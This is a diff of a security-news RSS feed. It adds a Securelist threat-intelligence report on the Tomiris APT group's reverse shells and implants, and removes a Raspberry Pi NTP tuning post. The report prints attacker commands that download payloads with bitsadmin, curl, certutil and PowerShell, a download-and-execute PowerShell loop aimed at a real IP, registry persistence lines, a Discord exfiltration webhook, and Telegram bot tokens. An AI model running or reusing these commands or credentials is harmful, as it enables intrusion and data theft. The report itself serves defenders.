@@ -1,4 +1,74 @@
-<?xml version="1.0" encoding="utf-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Cyber Security News</title><link>https://news.securehub.cc</link><description>Liveboat RSS Feed</description><item><title>CVE-2025-64314 - Cisco Memory Management Permission Control Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-64314</link><author></author><category>vulns</category><pubDate>Fri, 28 Nov 2025 03:16:00 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-64314
+<?xml version="1.0" encoding="utf-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Cyber Security News</title><link>https://news.securehub.cc</link><description>Liveboat RSS Feed</description><item><title>Tomiris wreaks Havoc: New tools and techniques of the APT group</title><link>https://securelist.com/tomiris-new-tools/118143/</link><author>Oleg Kupreev, Artem Ushkov</author><category>threatintel</category><enclosure url="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/11/26075144/SL-Tomiris-Telegram-featured-150x150.jpg" length="" type=""/><pubDate>Fri, 28 Nov 2025 07:00:06 +0000</pubDate><source url="https://securelist.com/">Securelist</source><content:encoded><![CDATA[While tracking the activities of the Tomiris threat actor, we identified new malicious operations that began in early 2025. These attacks targeted foreign ministries, intergovernmental organizations, and government entities, demonstrating a focus on high-value political and diplomatic infrastructure. In several cases, we traced the threat actor’s actions from initial infection to the deployment of post-exploitation frameworks.These attacks highlight a notable shift in Tomiris’s tactics, namely the increased use of implants that leverage public services (e.g., Telegram and Discord) as command-and-control (C2) servers. This approach likely aims to blend malicious traffic with legitimate service activity to evade detection by security tools.Most infections begin with the deployment of reverse shell tools written in various programming languages, including Go, Rust, C/C#/C++, and Python. Some of them then deliver an open-source C2 framework: Havoc or AdaptixC2.This report in a nutshell:New implants developed in multiple programming languages were discovered;Some of the implants use Telegram and Discord to communicate with a C2;Operators employed Havoc and AdaptixC2 frameworks in subsequent stages of the attack lifecycle.Kaspersky’s products detect these threats as:HEUR:Backdoor.Win64.RShell.gen,HEUR:Backdoor.MSIL.RShell.gen,HEUR:Backdoor.Win64.Telebot.gen,HEUR:Backdoor.Python.Telebot.gen,HEUR:Trojan.Win32.RProxy.gen,HEUR:Trojan.Win32.TJLORT.a,HEUR:Backdoor.Win64.AdaptixC2.a.The infection begins with a phishing email containing a malicious archive. The archive is often password-protected, and the password is typically included in the text of the email. Inside the archive is an executable file. In some cases, the executable’s icon is disguised as an office document icon, and the file name includes a double extension such as . However, malicious executable files without icons or double extensions are also frequently encountered in archives. These files often have very long names that are not displayed in full when viewing the archive, so their extensions remain hidden from the user.Example of a phishing email containing a malicious archiveExample of an archive with a malicious executableWhen the file is executed, the system becomes infected. However, different implants were often present under the same file names in the archives, and the attackers’ actions varied from case to case.Tomiris C/C++ ReverseShellTomiris C/C++ ReverseShell infection schemaThis implant is a reverse shell that waits for commands from the operator (in most cases that we observed, the infection was human-operated). After a quick environment check, the attacker typically issues a command to download another backdoor – AdaptixC2. AdaptixC2 is a modular framework for post-exploitation, with source code available on GitHub. Attackers use built-in OS utilities like bitsadmin, curl, PowerShell, and certutil to download AdaptixC2. The typical scenario for using the Tomiris C/C++ reverse shell is outlined below.Environment reconnaissance. The attackers collect various system information, including information about the current user, network configuration, etc.echo 4fUPU7tGOJBlT6D1wZTUk
+whoami
+ipconfig /all
+systeminfo
+hostname
+net user /dom
+dir 
+dir C:\users\[username]Download of the next-stage implant. The attackers try to download AdaptixC2 from several URLs.bitsadmin /transfer www /download http://<HOST>/winupdate.exe $public\libraries\winvt.exe
+curl -o $public\libraries\service.exe http://<HOST>/service.exe
+certutil -urlcache -f https://<HOST>/AkelPad.rar $public\libraries\AkelPad.rar
+powershell.exe -Command powershell -Command "Invoke-WebRequest -Uri 'https://<HOST>/winupdate.exe' -OutFile '$public\pictures\sbschost.exe'Verification of download success. Once the download is complete, the attackers check that AdaptixC2 is present in the target folder and has not been deleted by security solutions.dir $temp
+dir $public\librariesEstablishing persistence for the downloaded payload. The downloaded implant is added to the Run registry key.reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WinUpdate /t REG_SZ /d $public\pictures\winupdate.exe /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Win-NetAlone" /t REG_SZ /d "$public\videos\alone.exe"
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Winservice" /t REG_SZ /d "$public\Pictures\dwm.exe"
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v CurrentVersion/t REG_SZ /d $public\Pictures\sbschost.exe /fVerification of persistence success. Finally, the attackers check that the implant is present in the Run registry key.reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+This year, we observed three variants of the C/C++ reverse shell whose functionality ultimately provided access to a remote console. All three variants have minimal functionality – they neither replicate themselves nor persist in the system. In essence, if the running process is terminated before the operators download and add the next-stage implant to the registry, the infection ends immediately.The first variant is likely based on the Tomiris Downloader source code discovered in 2021. This is evident from the use of the same function to hide the application window.Code of window-hiding function in Tomiris C/C++ ReverseShell and Tomiris DownloaderBelow are examples of the key routines for each of the detected variants.Tomiris C/C++ ReverseShell main routineTomiris Rust Downloader is a previously undocumented implant written in Rust. Although the file size is relatively large, its functionality is minimal.Tomiris Rust Downloader infection schemaUpon execution, the Trojan first collects system information by running a series of console commands sequentially."cmd" /C "ipconfig /all"
+"cmd" /C "echo %username%"
+"cmd" /C hostname
+"cmd" /C ver
+"cmd" /C curl hxxps://ipinfo[.]io/ip
+"cmd" /C curl hxxps://ipinfo[.]io/country
+Then it searches for files and compiles a list of their paths. The Trojan is interested in files with the following extensions: .jpg, .jpeg, .png, .txt, .rtf, .pdf, .xlsx, and .docx. These files must be located on drives C:/, D:/, E:/, F:/, G:/, H:/, I:/, or J:/. At the same time, it ignores paths containing the following strings: “.wrangler”, “.git”, “node_modules”, “Program Files”, “Program Files (x86)”, “Windows”, “Program Data”, and “AppData”.A multipart POST request is used to send the collected system information and the list of discovered file paths to Discord via the URL:hxxps://discordapp[.]com/api/webhooks/1392383639450423359/TmFw-WY-u3D3HihXqVOOinL73OKqXvi69IBNh_rr15STd3FtffSP2BjAH59ZviWKWJRX
+It is worth noting that only the paths to the discovered files are sent to Discord; the Trojan does not transmit the actual files.The structure of the multipart request is shown below:Contents of the Content-Disposition headerform-data; name=”payload_json”System information collected from the infected system via console commands and converted to JSON.form-data; name=”file”; filename=”files.txt”A list of files discovered on the drives.form-data; name=”file2″; filename=”ipconfig.txt”Results of executing console commands like “ipconfig /all”.Example of “payload_json”After sending the request, the Trojan creates two scripts,  and , in the temporary directory. Before dropping  to the disk, Rust Downloader creates a URL from hardcoded pieces and adds it to the script. It then executes  using the  utility, which in turn runs  via PowerShell. The  script runs in an infinite loop with a one-minute delay. It attempts to download a ZIP archive from the URL provided by the downloader, extract it to , and execute all unpacked files with the .exe extension. The placeholder  in  is replaced with the name of the infected computer.Set Shell = CreateObject("WScript.Shell")
+Shell.Run "powershell -ep Bypass -w hidden -File %temp%\script.ps1"$Url = "hxxp://193.149.129[.]113/<PC_NAME>" 
+$dUrl = $Url + "/1.zip" 
+while($true){
+    try{
+        $Response = Invoke-WebRequest -Uri $Url -UseBasicParsing -ErrorAction Stop
+        iwr -OutFile $env:Temp\1.zip -Uri $dUrl
+        New-Item -Path $env:TEMP\rfolder -ItemType Directory
+        tar -xf $env:Temp\1.zip -C $env:Temp\rfolder
+        Get-ChildItem $env:Temp\rfolder -Filter "*.exe" | ForEach-Object {Start-Process $_.FullName }
+        break
+    }catch{
+        Start-Sleep -Seconds 60
+    }
+}
+It’s worth noting that in at least one case, the downloaded archive contained an executable file associated with Havoc, another open-source post-exploitation framework.Tomiris Python Discord ReverseShellThe Trojan is written in Python and compiled into an executable using PyInstaller. The main script is also obfuscated with PyArmor. We were able to remove the obfuscation and recover the original script code. The Trojan serves as the initial stage of infection and is primarily used for reconnaissance and downloading subsequent implants. We observed it downloading the AdaptixC2 framework and the Tomiris Python FileGrabber.Tomiris Python Discord ReverseShell infection schemaThe Trojan is based on the “discord” Python package, which implements communication via Discord, and uses the messenger as the C2 channel. Its code contains a URL to communicate with the Discord C2 server and an authentication token. Functionally, the Trojan acts as a reverse shell, receiving text commands from the C2, executing them on the infected system, and sending the execution results back to the C2.Python Discord ReverseShellTomiris Python FileGrabberAs mentioned earlier, this Trojan is installed in the system via the Tomiris Python Discord ReverseShell. The attackers do this by executing the following console command.cmd.exe /c "curl -o $public\videos\offel.exe http://<HOST>/offel.exe"
+The Trojan is written in Python and compiled into an executable using PyInstaller. It collects files with the following extensions into a ZIP archive: .jpg, .png, .pdf, .txt, .docx, and .doc. The resulting archive is sent to the C2 server via an HTTP POST request. During the file collection process, the following folder names are ignored: “AppData”, “Program Files”, “Windows”, “Temp”, “System Volume Information”, “$RECYCLE.BIN”, and “bin”.Distopia Backdoor infection schemaThe backdoor is based entirely on the GitHub repository project “dystopia-c2” and is written in Python. The executable file was created using PyInstaller. The backdoor enables the execution of console commands on the infected system, the downloading and uploading of files, and the termination of processes. In one case, we were able to trace a command used to download another Trojan – Tomiris Python Telegram ReverseShell.Sequence of console commands executed by attackers on the infected system:cmd.exe /c "dir"
+cmd.exe /c "dir C:\user\[username]\pictures"
+cmd.exe /c "pwd"
+cmd.exe /c "curl -O $public\sysmgmt.exe http://<HOST>/private/svchost.exe"
+cmd.exe /c "$public\sysmgmt.exe"Tomiris Python Telegram ReverseShellThe Trojan is written in Python and compiled into an executable using PyInstaller. The main script is also obfuscated with PyArmor. We managed to remove the obfuscation and recover the original script code. The Trojan uses Telegram to communicate with the C2 server, with code containing an authentication token and a “chat_id” to connect to the bot and receive commands for execution. Functionally, it is a reverse shell, capable of receiving text commands from the C2, executing them on the infected system, and sending the execution results back to the C2.Initially, we assumed this was an updated version of the Telemiris bot previously used by the group. However, after comparing the original scripts of both Trojans, we concluded that they are distinct malicious tools.Python Telegram ReverseShell (to the right) and Telemiris (to the left)Other implants used as first-stage infectorsBelow, we list several implants that were also distributed in phishing archives. Unfortunately, we were unable to track further actions involving these implants, so we can only provide their descriptions.Tomiris C# Telegram ReverseShellAnother reverse shell that uses Telegram to receive commands. This time, it is written in C# and operates using the following credentials:URL = hxxps://api.telegram[.]org/bot7804558453:AAFR2OjF7ktvyfygleIneu_8WDaaSkduV7k/
+CHAT_ID = 7709228285Tomiris C# Telegram ReverseShellOne of the oldest implants used by malicious actors has undergone virtually no changes since it was first identified in 2022. It is capable of taking screenshots, executing console commands, and uploading files from the infected system to the C2. The current version of the Trojan lacks only the  command.Tomiris Rust ReverseShellThis Trojan is a simple reverse shell written in the Rust programming language. Unlike other reverse shells used by attackers, it uses PowerShell as the shell rather than .Strings used by main routine of Tomiris Rust ReverseShellThe Trojan is a simple reverse shell written in Go. We were able to restore the source code. It establishes a TCP connection to 62.113.114.209 on port 443, runs  and redirects standard command line input and output to the established connection.Restored code of Tomiris Go ReverseShellTomiris PowerShell Telegram BackdoorThe original executable is a simple packer written in C++. It extracts a Base64-encoded PowerShell script from itself and executes it using the following command line:powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABjAGgAYQB0AF8AaQBkACAAPQAgACIANwA3ADAAOQAyADIAOAAyADgANQ…………
+The extracted script is a backdoor written in PowerShell that uses Telegram to communicate with the C2 server. It has only two key commands:: Download a file from Telegram using a  identifier provided as a parameter and save it to “C:\Users\Public\Libraries\” with the name specified in the parameter .: Execute a provided command in the console and return the results as a Telegram message.The script uses the following credentials for communication:$chat_id = "7709228285"
+$botToken = "8039791391:AAHcE2qYmeRZ5P29G6mFAylVJl8qH_ZVBh8"
+$apiUrl = "hxxps://api.telegram[.]org/bot$botToken/"Strings used by main routine of Tomiris PowerShell Telegram BackdoorA simple reverse shell written in C#. It doesn’t support any additional commands beyond console commands.Tomiris C# ReverseShell main routineDuring the investigation, we also discovered several reverse SOCKS proxy implants on the servers from which subsequent implants were downloaded. These samples were also found on infected systems. Unfortunately, we were unable to determine which implant was specifically used to download them. We believe these implants are likely used to proxy traffic from vulnerability scanners and enable lateral movement within the network.Tomiris C++ ReverseSocks (based on GitHub Neosama/Reverse-SOCKS5)The implant is a reverse SOCKS proxy written in C++, with code that is almost entirely copied from the GitHub project Neosama/Reverse-SOCKS5. Debugging messages from the original project have been removed, and functionality to hide the console window has been added.Main routine of Tomiris C++ ReverseSocksTomiris Go ReverseSocks (based on GitHub Acebond/ReverseSocks5)The Trojan is a reverse SOCKS proxy written in Golang, with code that is almost entirely copied from the GitHub project Acebond/ReverseSocks5. Debugging messages from the original project have been removed, and functionality to hide the console window has been added.Difference between the restored main function of the Trojan code and the original code from the GitHub projectOver 50% of the spear-phishing emails and decoy files in this campaign used Russian names and contained Russian text, suggesting a primary focus on Russian-speaking users or entities. The remaining emails were tailored to users in Turkmenistan, Kyrgyzstan, Tajikistan, and Uzbekistan, and included content in their respective national languages.In our previous report, we described the JLORAT tool used by the Tomiris APT group. By analyzing numerous JLORAT samples, we were able to identify several distinct propagation patterns commonly employed by the attackers. These patterns include the use of long and highly specific filenames, as well as the distribution of these tools in password-protected archives with passwords in the format “xyz@2025” (for example, “min@2025” or “sib@2025”). These same patterns were also observed with reverse shells and other tools described in this article. Moreover, different malware samples were often distributed under the same file name, indicating their connection. Below is a brief list of overlaps among tools with similar file names:Filename (for convenience, we used the asterisk character to substitute numerous space symbols before file extension)аппарат правительства российской федерации по вопросу отнесения реализуемых на территории сибирского федерального округа*.exe(translated: Federal Government Agency of the Russian Federation regarding the issue of designating objects located in the Siberian Federal District*.exe)Tomiris C/C++ ReverseShell:
+078be0065d0277935cdcf7e3e9db4679
+33ed1534bbc8bd51e7e2cf01cadc9646
+536a48917f823595b990f5b14b46e676
+9ea699b9854dde15babf260bed30efccTomiris Rust ReverseShell:
+9a9b1ba210ac2ebfe190d1c63ec707faTomiris Go ReverseShell:
+c26e318f38dfd17a233b23a3ff80b5f4Tomiris PowerShell Telegram Backdoor:
+c75665e77ffb3692c2400c3c8dd8276bО работе почтового сервера план и проведенная работа*.exe(translated: Work of the mail server: plan and performed work*.exe)Tomiris C/C++ ReverseShell:
+0f955d7844e146f2bd756c9ca8711263Tomiris Rust Downloader:
+1083b668459beacbc097b3d4a103623fTomiris C# ReverseShell:
+abb3e2b8c69ff859a0ec49b9666f0a01Tomiris Go ReverseShell:
+c26e318f38dfd17a233b23a3ff80b5f4план-протокол встречи о сотрудничестве представителей*.exe(translated: Meeting plan-protocol on cooperation representatives*.exe)Tomiris PowerShell Telegram Backdoor:
+09913c3292e525af34b3a29e70779ad6
+0ddc7f3cfc1fb3cea860dc495a745d16Tomiris C/C++ ReverseShell:
+0f955d7844e146f2bd756c9ca8711263Tomiris Rust Downloader:
+1083b668459beacbc097b3d4a103623f
+72327bf7a146273a3cfec79c2cbbe54e
+d3641495815c9617e58470448a1c94dbJLORAT:
+c73c545c32e5d1f72b74ab0087ae1720положения о центрах передового опыта (превосходства) в рамках межгосударственной программы*.exe(translated: Provisions on Centers of Best Practices (Excellence) within the framework of the interstate program*.exe)Tomiris PowerShell Telegram Backdoor:
+09913c3292e525af34b3a29e70779ad6Tomiris C/C++ ReverseShell:
+33ed1534bbc8bd51e7e2cf01cadc9646
+9ea699b9854dde15babf260bed30efccJLORAT:
+6a49982272ba11b7985a2cec6fbb9a96
+c73c545c32e5d1f72b74ab0087ae1720Tomiris Rust Downloader:
+72327bf7a146273a3cfec79c2cbbe54eWe also analyzed the group’s activities and found other tools associated with them that may have been stored on the same servers or used the same servers as a C2 infrastructure. We are highly confident that these tools all belong to the Tomiris group.The Tomiris 2025 campaign leverages multi-language malware modules to enhance operational flexibility and evade detection by appearing less suspicious. The primary objective is to establish remote access to target systems and use them as a foothold to deploy additional tools, including AdaptixC2 and Havoc, for further exploitation and persistence.The evolution in tactics underscores the threat actor’s focus on stealth, long-term persistence, and the strategic targeting of government and intergovernmental organizations. The use of public services for C2 communications and multi-language implants highlights the need for advanced detection strategies, such as behavioral analysis and network traffic inspection, to effectively identify and mitigate such threats.Tomiris C++ ReverseSocks (based on GitHub “Neosama/Reverse-SOCKS5”)185.231.154[.]84]]></content:encoded></item><item><title>CVE-2025-64314 - Cisco Memory Management Permission Control Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-64314</link><author></author><category>vulns</category><pubDate>Fri, 28 Nov 2025 03:16:00 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-64314
  Nov. 28, 2025, 3:16 a.m. | 1 hour, 27 minutes ago
 Permission control vulnerability in the memory management module.
 Impact: Successful exploitation of this vulnerability may affect confidentiality.
@@ -1674,7 +1744,12 @@ ports that do not have a Rust compiler. By depending directly on Rust,
 though, APT itself would not be available on ports without a Rust
 compiler. LWN recently
 covered the state of Linux architecture support, and the status of
-Rust support for each one.None of the ports listed by Klode are among those officially
+Rust support for each one.No AI slop, all substance: subscribe to LWN today
+LWN has always been about quality over quantity; we need your help
+to continue publishing in-depth, reader-focused articles about Linux
+and the free-software community. Please subscribe today to support our work
+and keep LWN on the air; we are offering a free one-month trial subscription to get you started.
+None of the ports listed by Klode are among those officially
 supported by Debian today, or targeted for support in
 Debian 14 ("forky"). The sh4 port has never been officially
 supported, and none of the other ports have been supported since
@@ -2604,260 +2679,7 @@ Security Point (Windows) of MaLion and MaLionCloud contains a stack-based buffer
 
 Visit the link for more details, such as CVSS details, affected products, timeline, and more...
 ]]></content:encoded></item><item><title>CISA Warns of Active Spyware Campaigns Hijacking High-Value Signal and WhatsApp Users</title><link>https://thehackernews.com/2025/11/cisa-warns-of-active-spyware-campaigns.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjyjmpd6o7-HWK7FLfSLWXDI1Y5FeB1NBpBd4vIIk_CddP-R_hMTbVUynU6YynC6tMw-A36Q47s4bAyb7_rgYsf-V4M8gFCerUIDc4IO4tFHdyLWEMvvaaUguvfH6a3gdunla1LzgQVPdk4E9ETUTqlfH-xM-Gx9J2SKQXA2_A9l16PBY2o94m79CPEY4IZ/s1600/apps.jpg" length="" type=""/><pubDate>Tue, 25 Nov 2025 06:42:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Monday issued an alert warning of bad actors actively leveraging commercial spyware and remote access trojans (RATs) to target users of mobile messaging applications.
-"These cyber actors use sophisticated targeting and social engineering techniques to deliver spyware and gain unauthorized access to a victim's messaging app,]]></content:encoded></item><item><title>Most Stable Raspberry Pi? Better NTP with Thermal Management</title><link>https://austinsnerdythings.com/2025/11/24/worlds-most-stable-raspberry-pi-81-better-ntp-with-thermal-management/</link><author>todsacerdoti</author><category>dev</category><pubDate>Tue, 25 Nov 2025 06:35:59 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[But there was a problem. Despite having a stable PPS reference, my NTP server’s frequency drift was exhibiting significant variation over time. After months (years) of monitoring the system with Grafana dashboards, I noticed something interesting: the frequency oscillations seemed to correlate with CPU temperature changes. The frequency would drift as the CPU heated up during the day and cooled down at night, even though the PPS reference remained rock-solid.Like clockwork (no pun intended), I somehow get sucked back into trying to improve my setup every 6-8 weeks. This post is the latest on that never-ending quest.This post details how I achieved an 81% reduction in frequency variability and 77% reduction in frequency standard deviation through a combination of CPU core pinning and thermal stabilization. Welcome to Austin’s Nerdy Things, where we solve problems that 99.999% of people (and 99% of datacenters) don’t have.The Problem: Thermal-Induced Timing JitterModern CPUs, including those in Raspberry Pis, use dynamic frequency scaling to save power and manage heat. When the CPU is idle, it runs at a lower frequency (and voltage). When load increases, it scales up. This is great for power efficiency, but terrible for precision timekeeping.Why? Because timekeeping (with NTP/chronyd/others) relies on a stable system clock to discipline itself against reference sources. If the CPU frequency is constantly changing, the system clock’s tick rate varies, introducing jitter into the timing measurements. Even though my PPS signal was providing a mostly perfect 1-pulse-per-second reference, the CPU’s frequency bouncing around made it harder for chronyd to maintain a stable lock.But here’s the key insight: the system clock is ultimately derived from a crystal oscillator, and crystal oscillator frequency is temperature-dependent. The oscillator sits on the board near the CPU, and as the CPU heats up and cools down throughout the day, so does the crystal. Even a few degrees of temperature change can shift the oscillator’s frequency by parts per million – exactly what I was seeing in my frequency drift graphs. The CPU frequency scaling was one factor, but the underlying problem was that temperature changes were affecting the crystal oscillator itself. By stabilizing the CPU temperature, I could stabilize the thermal environment for the crystal oscillator, keeping its frequency consistent.Looking at my Grafana dashboard, I could see the frequency offset wandering over a range of about 1 PPM (parts per million) as the Pi warmed up and cooled down throughout the day. The RMS offset was averaging around 86 nanoseconds, which isn’t terrible (it’s actually really, really, really good), but I knew it could be better.After staring at graphs for longer than I’d like to admit, I had an idea: what if I could keep the CPU at a constant temperature? If the temperature (and therefore the frequency) stayed stable, maybe the timing would stabilize too.The solution came in two parts:1.  – Dedicate CPU 0 exclusively to timing-critical tasks (chronyd and PPS interrupts) 2.  – Keep the other CPUs busy to maintain a constant temperature, preventing frequency scalingHere’s what happened when I turned on the thermal stabilization system on November 17, 2025 at 09:10 AM:Same ish graph but with CPU temp also plotted:That vertical red line marks on the first plot when I activated the “time burner” process. Notice how the frequency oscillations immediately dampen and settle into a much tighter band? Let’s dive into how this works.The Solution Part 1: CPU Core Pinning and Real-Time PriorityThe first step is isolating timing-critical operations onto a dedicated CPU core. On a Raspberry Pi (4-core ARM), this means:CPU 0: Reserved for chronyd and PPS interruptsCPUs 1-3: Everything else, including our thermal loadI had AI (probably Claude Sonnet 4 ish, maybe 4.5) create a boot optimization script that runs at system startup:#!/bin/bash
-# PPS NTP Server Performance Optimization Script
-# Sets CPU affinity, priorities, and performance governor at boot
-
-set -e
-
-echo "Setting up PPS NTP server performance optimizations..."
-
-# Wait for system to be ready
-sleep 5
-
-# Set CPU governor to performance mode
-echo "Setting CPU governor to performance..."
-cpupower frequency-set -g performance
-
-# Pin PPS interrupt to CPU0 (may fail if already pinned, that's OK)
-echo "Configuring PPS interrupt affinity..."
-echo 1 > /proc/irq/200/smp_affinity 2>/dev/null || echo "PPS IRQ already configured"
-
-# Wait for chronyd to start
-echo "Waiting for chronyd to start..."
-timeout=30
-while [ $timeout -gt 0 ]; do
-    chronyd_pid=$(pgrep chronyd 2>/dev/null || echo "")
-    if [ -n "$chronyd_pid" ]; then
-        echo "Found chronyd PID: $chronyd_pid"
-        break
-    fi
-    sleep 1
-    ((timeout--))
-done
-
-if [ -z "$chronyd_pid" ]; then
-    echo "Warning: chronyd not found after 30 seconds"
-else
-    # Set chronyd to real-time priority and pin to CPU 0
-    echo "Setting chronyd to real-time priority and pinning to CPU 0..."
-    chrt -f -p 50 $chronyd_pid
-    taskset -cp 0 $chronyd_pid
-fi
-
-# Boost ksoftirqd/0 priority
-echo "Boosting ksoftirqd/0 priority..."
-ksoftirqd_pid=$(ps aux | grep '\[ksoftirqd/0\]' | grep -v grep | awk '{print $2}')
-if [ -n "$ksoftirqd_pid" ]; then
-    renice -n -10 $ksoftirqd_pid
-    echo "ksoftirqd/0 priority boosted (PID: $ksoftirqd_pid)"
-else
-    echo "Warning: ksoftirqd/0 not found"
-fi
-
-echo "PPS NTP optimization complete!"
-
-# Log current status
-echo "=== Current Status ==="
-echo "CPU Governor: $(cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor)"
-echo "PPS IRQ Affinity: $(cat /proc/irq/200/effective_affinity_list 2>/dev/null || echo 'not readable')"
-if [ -n "$chronyd_pid" ]; then
-    echo "chronyd Priority: $(chrt -p $chronyd_pid)"
-fi
-echo "======================": Forces all CPUs to run at maximum frequency, disabling frequency scaling: Ensures PPS interrupt (IRQ 200) is handled exclusively by CPU 0Chronyd Real-Time Priority: Sets chronyd to SCHED_FIFO priority 50, giving it preferential CPU schedulingC: Pins chronyd to CPU 0 using : Improves priority of the kernel softirq handler on CPU 0This script can be added to  or as a systemd service to run at boot.The Solution Part 2: PID-Controlled Thermal StabilizationSetting the performance governor helps, but on a Raspberry Pi, even at max frequency, the CPU temperature will still vary based on ambient conditions and load. Temperature changes affect the CPU’s actual operating frequency due to thermal characteristics of the silicon.The solution? Keep the CPU at a constant temperature using a PID-controlled thermal load. I call it the “time burner” (inspired by CPU burn-in tools, but with precise temperature control).As a reminder of what we’re really doing here: we’re maintaining a stable thermal environment for the crystal oscillator. The RPi 3B’s 19.2 MHz oscillator is physically located near the CPU on the Raspberry Pi board, so by actively controlling CPU temperature, we’re indirectly controlling the oscillator’s temperature. Since the oscillator’s frequency is temperature-dependent (this is basic physics of quartz crystals), keeping it at a constant temperature means keeping its frequency stable – which is exactly what we need for precise timekeeping. from /sys/class/thermal/thermal_zone0/temp calculates how much CPU time to burn to maintain target temperature (I chose 54°C)  run on CPUs 1, 2, and 3 (avoiding CPU 0)  alternates between busy-loop (MD5 hashing) and sleeping based on PID output  at the setpoint, preventing thermal driftHere’s the core implementation (simplified for readability):#!/usr/bin/env python3
-import time
-import argparse
-import multiprocessing
-import hashlib
-import os
-from collections import deque
-
-class PIDController:
-    """Simple PID controller with output clamping and anti-windup."""
-    def __init__(self, Kp, Ki, Kd, setpoint, output_limits=(0, 1), sample_time=1.0):
-        self.Kp = Kp
-        self.Ki = Ki
-        self.Kd = Kd
-        self.setpoint = setpoint
-        self.output_limits = output_limits
-        self.sample_time = sample_time
-        self._last_time = time.time()
-        self._last_error = 0.0
-        self._integral = 0.0
-        self._last_output = 0.0
-
-    def update(self, measurement):
-        """Compute new output of PID based on measurement."""
-        now = time.time()
-        dt = now - self._last_time
-
-        if dt < self.sample_time:
-            return self._last_output
-
-        error = self.setpoint - measurement
-
-        # Proportional
-        P = self.Kp * error
-
-        # Integral with anti-windup
-        self._integral += error * dt
-        I = self.Ki * self._integral
-
-        # Derivative
-        derivative = (error - self._last_error) / dt if dt > 0 else 0.0
-        D = self.Kd * derivative
-
-        # Combine and clamp
-        output = P + I + D
-        low, high = self.output_limits
-        output = max(low, min(high, output))
-
-        self._last_output = output
-        self._last_error = error
-        self._last_time = now
-
-        return output
-
-def read_cpu_temperature(path='/sys/class/thermal/thermal_zone0/temp'):
-    """Return CPU temperature in Celsius."""
-    with open(path, 'r') as f:
-        temp_str = f.read().strip()
-    return float(temp_str) / 1000.0
-
-def burn_cpu(duration):
-    """Busy-loop hashing for 'duration' seconds."""
-    end_time = time.time() + duration
-    m = hashlib.md5()
-    while time.time() < end_time:
-        m.update(b"burning-cpu")
-
-def worker_loop(worker_id, cmd_queue, done_queue):
-    """
-    Worker process:
-    - Pins itself to CPUs 1, 2, or 3 (avoiding CPU 0)
-    - Burns CPU based on commands from main process
-    """
-    available_cpus = [1, 2, 3]
-    cpu_to_use = available_cpus[worker_id % len(available_cpus)]
-    os.sched_setaffinity(0, {cpu_to_use})
-    print(f"Worker {worker_id} pinned to CPU {cpu_to_use}")
-
-    while True:
-        cmd = cmd_queue.get()
-        if cmd is None:
-            break
-
-        burn_time, sleep_time = cmd
-        burn_cpu(burn_time)
-        time.sleep(sleep_time)
-        done_queue.put(worker_id)
-
-# Main control loop (simplified)
-def main():
-    target_temp = 54.0  # degrees Celsius
-    control_window = 0.20  # 200ms cycle time
-
-    pid = PIDController(Kp=0.05, Ki=0.02, Kd=0.0,
-                        setpoint=target_temp,
-                        sample_time=0.18)
-
-    # Start 3 worker processes
-    workers = []
-    cmd_queues = []
-    done_queue = multiprocessing.Queue()
-
-    for i in range(3):
-        q = multiprocessing.Queue()
-        p = multiprocessing.Process(target=worker_loop, args=(i, q, done_queue))
-        p.start()
-        workers.append(p)
-        cmd_queues.append(q)
-
-    try:
-        while True:
-            # Measure temperature
-            current_temp = read_cpu_temperature()
-
-            # PID control: output is fraction of time to burn (0.0 to 1.0)
-            output = pid.update(current_temp)
-
-            # Convert to burn/sleep times
-            burn_time = output * control_window
-            sleep_time = control_window - burn_time
-
-            # Send command to all workers
-            for q in cmd_queues:
-                q.put((burn_time, sleep_time))
-
-            # Wait for workers to complete
-            for _ in range(3):
-                done_queue.get()
-
-            print(f"Temp={current_temp:.2f}C, Output={output:.2f}, "
-                  f"Burn={burn_time:.2f}s")
-
-    except KeyboardInterrupt:
-        for q in cmd_queues:
-            q.put(None)
-        for p in workers:
-            p.join()
-
-if __name__ == '__main__':
-    main()The full implementation includes a temperature filtering system to smooth out sensor noise and command-line arguments for tuning the PID parameters.: Proportional gain – responds to current error: Integral gain – eliminates steady-state error: Derivative gain – set to zero because temperature changes slowlyThe target temperature of 54°C was chosen empirically – high enough to keep the CPU from idling down, but low enough to avoid thermal throttling (which starts around 80°C on Raspberry Pi).The Results: Numbers Don’t LieThe improvement was immediately visible. Here are the statistics comparing performance before and after the optimization:A note on ambient conditions: The Raspberry Pi lives in a project enclosure in our master bedroom (chosen for its decent GPS reception and ADS-B coverage for a new aircraft AR overlay app idea I’m working on also running on this Pi). While the time burner maintains the CPU die temperature at 54°C, the enclosure is still subject to ambient temperature swings. Room temperature cycles from a low of 66°F (18.9°C) at 5:15 AM to a peak of 72°F (22.2°C) at 11:30 AM – a 6°F daily swing from our heating schedule. The fact that we see such dramatic frequency stability improvements  this ambient variation speaks to how effective the thermal control is. The CPU’s active heating overwhelms the environmental changes, maintaining consistent silicon temperature where it matters most.The RMS offset is chronyd’s estimate of the timing uncertainty. Cutting this nearly in half means the system is maintaining significantly better time accuracy.Want to replicate this? Here’s the step-by-step process:You need a working GPS PPS NTP server setup. If you don’t have one yet, follow my 2025 NTP guide first.Step 0: Install Required Toolssudo apt-get update
